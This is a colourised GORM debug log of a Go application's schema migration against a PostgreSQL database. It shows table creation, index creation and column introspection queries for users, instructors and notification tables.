2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.099ms] [34;1m[rows:0][0m CREATE TABLE "notification_admins" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"admin_id" bigint,"notification_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_notification_admins_admin" FOREIGN KEY ("admin_id") REFERENCES "admins"("id"),CONSTRAINT "fk_notification_admins_notification" FOREIGN KEY ("notification_id") REFERENCES "notifications"("id"))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.043ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_notification_admins_deleted_at" ON "notification_admins" ("deleted_at")

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.755ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.438ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.500ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.597ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[27.999ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[31.752ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.863ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.102ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.380ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.300ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.312ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.341ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.227ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.208ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.270ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.142ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.144ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.173ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.136ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.998ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.061ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.804ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.701ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.370ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.494ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.560ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.777ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.607ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.535ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.082ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.309ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.112ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.088ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.379ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.514ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.052ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.649ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.368ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.687ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.400ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.886ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'notifications'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.102ms] [34;1m[rows:-][0m SELECT * FROM "notifications" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.890ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'notifications' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.782ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'notifications'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.246ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'notifications'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.098ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.498ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.148ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.122ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.413ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'message') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.140ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'type') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.394ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'send_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.102ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'read') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.828ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'notifications' AND indexname = 'idx_notifications_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.595ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notification_instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[26.416ms] [34;1m[rows:0][0m CREATE TABLE "notification_instructors" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"instructor_id" bigint,"notification_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_notification_instructors_notification" FOREIGN KEY ("notification_id") REFERENCES "notifications"("id"),CONSTRAINT "fk_notification_instructors_instructor" FOREIGN KEY ("instructor_id") REFERENCES "instructors"("id"))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.814ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_notification_instructors_deleted_at" ON "notification_instructors" ("deleted_at")

